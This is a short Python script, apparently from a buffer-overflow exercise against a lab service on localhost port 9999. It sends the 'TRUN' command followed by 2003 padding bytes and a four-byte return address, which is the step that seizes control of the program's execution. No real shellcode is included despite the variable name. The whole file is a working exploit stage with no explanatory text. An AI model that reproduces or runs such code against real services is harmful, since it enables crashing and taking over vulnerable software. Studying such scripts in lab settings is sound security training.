#!/bin/python3

from time import sleep
import sys, socket



shellcode = b"A" * 2003 + b"\xaf\x11\x50\x62" 

try:
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect(('127.0.0.1', 9999)) 
     payload = b"TRUN /.:/" + shellcode
     s.send((payload))
     s.close()
except:
    print("Crashed")
    sys.exit()
